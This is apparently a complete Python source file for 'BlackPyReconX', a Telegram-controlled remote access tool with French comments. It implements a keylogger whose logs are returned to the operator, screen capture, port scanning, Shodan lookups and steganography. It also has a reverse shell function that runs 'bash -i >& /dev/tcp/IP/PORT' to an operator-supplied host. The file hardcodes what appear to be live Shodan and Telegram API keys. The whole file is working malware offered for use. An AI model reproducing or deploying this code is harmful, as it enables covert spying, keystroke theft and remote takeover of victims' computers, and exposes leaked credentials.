#!/usr/bin/env python3
"""
██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗ ██╗   ██╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗╚██╗ ██╔╝
██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝ ╚████╔╝ 
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔═══╝   ╚██╔╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║        ██║   
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝  
BlackPyReconX - Telegram Bot Version
"""

import os
import sys
import time
import socket
import requests
import threading
import logging
import configparser
from pynput import keyboard
from PIL import Image, ImageGrab
import stepic
import pyautogui
from telegram import Update, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters
)

# ==================== CONFIG ====================
CONFIG = configparser.ConfigParser()
CONFIG.read('config.ini')

if not os.path.exists('config.ini'):
    CONFIG['API'] = {
        'shodan': 'ecbuI7ZgtzcBskl53ON55umaWzOU7R2c',
        'telegram': '8334930899:AAEKPUFtiRIjSNG3T4BCwo7B7M0WiLhf-rY'
    }
    with open('config.ini', 'w') as f:
        CONFIG.write(f)

TOKEN = CONFIG['API']['telegram']
ADMIN_ID = 7722782917 # Remplacez par votre ID Telegram
OUTPUT_DIR = "outputs"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Configurer le logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# États pour les conversations
TARGET, PORT, DATA = range(3)
STEGANO_IMG, STEGANO_MSG = range(2)

# ==================== BACKEND FUNCTIONS ====================
class KeyLogger:
    def __init__(self):
        self.log_file = f"{OUTPUT_DIR}/keylog_{time.strftime('%Y%m%d-%H%M%S')}.log"
        self.active = False
        
    def on_press(self, key):
        if not self.active:
            return False
        with open(self.log_file, "a") as f:
            try:
                f.write(key.char)
            except AttributeError:
                special = {
                    keyboard.Key.space: " ",
                    keyboard.Key.enter: "\n",
                    keyboard.Key.tab: "[TAB]",
                    keyboard.Key.esc: "[ESC]"
                }
                f.write(special.get(key, f"[{key}]"))
        return True

    def start(self):
        self.active = True
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop(self):
        self.active = False
        return self.log_file

def scan_ports(target, ports=[21, 22, 80, 443, 3306]):
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def shodan_lookup(ip):
    try:
        api_key = CONFIG['API']['shodan']
        url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
        data = requests.get(url).json()
        return (
            f"IP: {data['ip_str']}\n"
            f"Organisation: {data.get('org', 'N/A')}\n"
            f"Ports ouverts: {data.get('ports', [])}\n"
            f"OS: {data.get('os', 'Inconnu')}"
        )
    except Exception as e:
        return f"Erreur Shodan: {str(e)}"

def take_screenshot():
    filename = f"{OUTPUT_DIR}/screenshot_{time.strftime('%Y%m%d-%H%M%S')}.png"
    ImageGrab.grab().save(filename)
    return filename

def hide_data(img_path, data, output_path):
    img = Image.open(img_path)
    encoded = stepic.encode(img, data.encode())
    encoded.save(output_path)
    return output_path

def extract_data(img_path):
    img = Image.open(img_path)
    return stepic.decode(img)

def reverse_shell(ip, port=4444):
    try:
        threading.Thread(
            target=lambda: os.system(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
            daemon=True
        ).start()
        return True
    except Exception as e:
        return False

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("🚫 Accès refusé")
        return

    menu = """
🔐 *BlackPyReconX Control Panel* 🔐

Commandes disponibles:
/scan - Scanner les ports
/osint - Recherche OSINT (Shodan)
/keylogger [start|stop|status] - Gestion keylogger
/screenshot - Prendre capture d'écran
/hide - Cacher message (stégano)
/extract - Extraire message
/shell - Shell inversé
/help - Aide
"""
    await update.message.reply_text(menu, parse_mode='Markdown')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ==================== MODULE HANDLERS ====================
# Keylogger Module
keylogger = KeyLogger()

async def keylogger_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /keylogger [start|stop|status]")
        return

    action = context.args[0].lower()
    
    if action == "start":
        if not keylogger.active:
            threading.Thread(target=keylogger.start).start()
            await update.message.reply_text("⌨️ Keylogger démarré")
        else:
            await update.message.reply_text("ℹ️ Keylogger déjà actif")
            
    elif action == "stop":
        if keylogger.active:
            log_file = keylogger.stop()
            with open(log_file, 'rb') as f:
                await update.message.reply_document(
                    document=InputFile(f),
                    caption="📝 Logs keylogger"
                )
            await update.message.reply_text("🛑 Keylogger arrêté")
        else:
            await update.message.reply_text("ℹ️ Keylogger déjà inactif")
            
    elif action == "status":
        status = "ACTIF" if keylogger.active else "INACTIF"
        await update.message.reply_text(f"📊 Status Keylogger: {status}")

# Scan Module
async def scan_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔍 Entrez l'IP/domaine à scanner:")
    return TARGET

async def scan_execute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text
    try:
        open_ports = scan_ports(target)
        await update.message.reply_text(
            f"🔍 Ports ouverts sur {target}:\n{', '.join(map(str, open_ports))}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")
    return ConversationHandler.END

# OSINT Module
async def osint_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🕵️ Entrez l'IP à rechercher:")
    return TARGET

async def osint_execute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip = update.message.text
    try:
        results = shodan_lookup(ip)
        await update.message.reply_text(
            f"📊 Résultats OSINT pour {ip}:\n```\n{results}\n```",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")
    return ConversationHandler.END

# Screenshot Module
async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        filename = take_screenshot()
        with open(filename, 'rb') as photo:
            await update.message.reply_photo(
                photo=photo,
                caption="📸 Capture d'écran"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")

# Stegano Module
async def stegano_hide_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📤 Envoyez l'image pour cacher le message:")
    return STEGANO_IMG

async def stegano_hide_img(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        photo_file = await update.message.photo[-1].get_file()
        img_path = f"{OUTPUT_DIR}/temp_img.png"
        await photo_file.download_to_drive(img_path)
        context.user_data['stegano_img'] = img_path
        await update.message.reply_text("💬 Entrez le message à cacher:")
        return STEGANO_MSG
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")
        return ConversationHandler.END

async def stegano_hide_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text
    img_path = context.user_data['stegano_img']
    output_path = f"{OUTPUT_DIR}/hidden_{os.path.basename(img_path)}"
    
    try:
        hide_data(img_path, msg, output_path)
        with open(output_path, 'rb') as f:
            await update.message.reply_document(
                document=InputFile(f),
                caption="🔒 Message caché dans l'image"
            )
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")
    finally:
        if os.path.exists(img_path):
            os.remove(img_path)
    return ConversationHandler.END

async def stegano_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.photo:
        await update.message.reply_text("📤 Envoyez l'image contenant le message caché")
        return
    
    try:
        photo_file = await update.message.photo[-1].get_file()
        img_path = f"{OUTPUT_DIR}/extract_temp.png"
        await photo_file.download_to_drive(img_path)
        
        message = extract_data(img_path)
        await update.message.reply_text(
            f"🔓 Message extrait:\n```\n{message}\n```",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")
    finally:
        if os.path.exists(img_path):
            os.remove(img_path)

# Reverse Shell Module
async def shell_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💻 Entrez l'IP pour le shell inversé:")
    return TARGET

async def shell_port(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip = update.message.text
    context.user_data['shell_ip'] = ip
    await update.message.reply_text("🔌 Entrez le port (défaut: 4444):")
    return PORT

async def shell_execute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip = context.user_data['shell_ip']
    port = update.message.text or "4444"
    
    try:
        if reverse_shell(ip, int(port)):
            await update.message.reply_text(f"🚀 Shell inversé lancé vers {ip}:{port}")
        else:
            await update.message.reply_text("❌ Échec du lancement du shell")
    except Exception as e:
        await update.message.reply_text(f"❌ Erreur: {str(e)}")
    return ConversationHandler.END

# ==================== MAIN ====================
def main():
    """Lancement du bot"""
    # Créer l'application
    application = Application.builder().token(TOKEN).build()

    # Handlers de conversation
    conv_scan = ConversationHandler(
        entry_points=[CommandHandler('scan', scan_start)],
        states={
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, scan_execute)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    conv_osint = ConversationHandler(
        entry_points=[CommandHandler('osint', osint_start)],
        states={
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, osint_execute)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    conv_stegano = ConversationHandler(
        entry_points=[CommandHandler('hide', stegano_hide_start)],
        states={
            STEGANO_IMG: [MessageHandler(filters.PHOTO, stegano_hide_img)],
            STEGANO_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, stegano_hide_msg)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    conv_shell = ConversationHandler(
        entry_points=[CommandHandler('shell', shell_start)],
        states={
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, shell_port)],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, shell_execute)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    # Commandes standards
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("keylogger", keylogger_control))
    application.add_handler(CommandHandler("screenshot", screenshot))
    application.add_handler(CommandHandler("extract", stegano_extract))

    # Handlers de conversation
    application.add_handler(conv_scan)
    application.add_handler(conv_osint)
    application.add_handler(conv_stegano)
    application.add_handler(conv_shell)

    # Démarrer le bot
    print("🤖 Bot BlackPyReconX démarré...")
    application.run_polling()

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Opération annulée")
    return ConversationHandler.END

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Erreur: {str(e)}")